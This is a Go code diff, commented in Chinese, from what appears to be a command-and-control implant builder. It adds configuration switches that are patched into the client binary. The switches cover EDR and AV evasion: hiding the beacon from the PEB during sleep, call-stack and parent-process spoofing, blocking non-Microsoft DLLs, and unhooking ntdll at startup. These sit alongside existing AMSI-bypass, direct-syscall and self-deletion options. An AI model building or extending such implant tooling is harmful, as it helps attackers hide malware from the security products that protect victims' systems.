@@ -45,6 +45,12 @@ type PatchOptions struct {
 	AmsiBypass  string // "1"=启用（默认）
 	SyscallMode string // none/direct/indirect（默认 none）
 	AutoDelete  string // "1"=上线后自动删除自身文件（默认 0）
+	// P4：P0–P3 已实现能力的细分开关（都只在 windows/amd64 上有实现；空值用客户端默认=关）
+	SleepMaskHide string // "1"=beacon 睡眠期把自身从 PEB 模块链表摘除（默认 0）
+	StackSpoof    string // "1"=direct syscall 走伪造调用栈（仅 syscallMode=direct 生效，默认 0）
+	PpidSpoof     string // "1"=派生子进程时伪造父进程（默认 0）
+	BlockDLLs     string // "1"=子进程只允许微软签名 DLL（默认 0）
+	UnhookOnStart string // "1"=启动时用磁盘映像恢复 ntdll/kernel32/kernelbase 内联 hook（默认 0）
 	// 流量层 OPSEC：metadata 通道 + 流量填充
 	MetadataChannel string // cookie/header/url/auto（默认 auto=每请求随机）
 	Padding         string // "1"=请求/响应随机填充（默认开）
@@ -203,6 +209,11 @@ func PatchClientBinary(binaryData []byte, opt PatchOptions) ([]byte, error) {
 		{"AMSI_BYPASS_PLACEHOLDER_12345", opt.AmsiBypass},
 		{"SYSCALL_MODE_PLACEHOLDER_12345", opt.SyscallMode},
 		{"AUTO_DELETE_PLACEHOLDER_12345", opt.AutoDelete},
+		{"SLEEP_MASK_HIDE_PLACEHOLDER_12345", opt.SleepMaskHide},
+		{"STACK_SPOOF_PLACEHOLDER_12345", opt.StackSpoof},
+		{"PPID_SPOOF_PLACEHOLDER_12345", opt.PpidSpoof},
+		{"BLOCK_DLLS_PLACEHOLDER_12345", opt.BlockDLLs},
+		{"UNHOOK_ON_START_PLACEHOLDER_12345", opt.UnhookOnStart},
 	}
 	defs := map[string]string{
 		"RECONNECT_BASE_DELAY_PLACEHOLDER_12345":  "1",
@@ -213,6 +224,11 @@ func PatchClientBinary(binaryData []byte, opt PatchOptions) ([]byte, error) {
 		"AMSI_BYPASS_PLACEHOLDER_12345":           "0",
 		"SYSCALL_MODE_PLACEHOLDER_12345":          "none",
 		"AUTO_DELETE_PLACEHOLDER_12345":           "1",
+		"SLEEP_MASK_HIDE_PLACEHOLDER_12345":       "0",
+		"STACK_SPOOF_PLACEHOLDER_12345":           "0",
+		"PPID_SPOOF_PLACEHOLDER_12345":            "0",
+		"BLOCK_DLLS_PLACEHOLDER_12345":            "0",
+		"UNHOOK_ON_START_PLACEHOLDER_12345":       "0",
 	}
 	for _, o := range opsecDefaults {
 		v := o.val
